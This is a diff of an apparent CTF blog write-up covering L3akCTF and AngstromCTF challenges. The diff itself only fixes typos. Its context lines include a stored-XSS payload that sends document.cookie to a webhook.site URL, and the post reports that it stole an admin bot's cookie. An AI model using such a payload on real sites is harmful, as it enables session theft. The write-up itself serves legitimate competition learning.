@@ -5,7 +5,7 @@ date: 2024-06-02
 categories: CTFs
 ---
 
-This week I tried out a couple of challenges from L3akCTF and AngstromCTF. While they were mostly web again, I tried my first rev as well. Overall, most of the chllenges felt slightly more advanced in terms of difficulty. 
+This week I tried out a couple of challenges from L3akCTF and AngstromCTF. While they were mostly web again, I tried my first rev as well. Overall, most of the challenges felt slightly more advanced in terms of difficulty. 
 
 ## SIMPLE CALCULATOR - L3AKCTF (WEB)
 
@@ -82,7 +82,7 @@ I made a post with this specific text content:
 <img src=x onerror="fetch('https://webhook.site/410fec2e-da06-4914-96be-866915b53dc5' + '?' + document.cookie)">
 ```
 
-This actually made my broser send my cookie to the webhook I set up, which proved the XSS worked. From here, I simply provided the link to the admin bot, and it visited the note. As soon as it did, the admin's browser sent its cookie to my webhook.
+This actually made my browser send my cookie to the webhook I set up, which proved the XSS worked. From here, I simply provided the link to the admin bot, and it visited the note. As soon as it did, the admin's browser sent its cookie to my webhook.
 
 ![Markdown](/assets/MarkDownXSSProof.jpg)
 
@@ -159,6 +159,6 @@ print(flag)
 
 Upon running the script, we get the flag: `actf{committed_to_the_least_significant_bit}`.
 
-I liked this introduction to rev. Obviously it gets much, much harder than this, but this is quite the cool start. 
+I liked this introduction to rev. Obviously it gets much, much harder than this, but this is quite a cool start. 
 
-There were defitely some great challenges this week - Angstrom is a consistently great competition, and L3ak was quite cool too. Next week will probably be quite similar in that I will focus mostly on web, while trying out a rev challenge or two. 
+There were definitely some great challenges this week - Angstrom is a consistently great competition, and L3ak was quite interesting as well. Next week will probably be quite similar in that I will focus mostly on web, while trying out a rev challenge or two. 
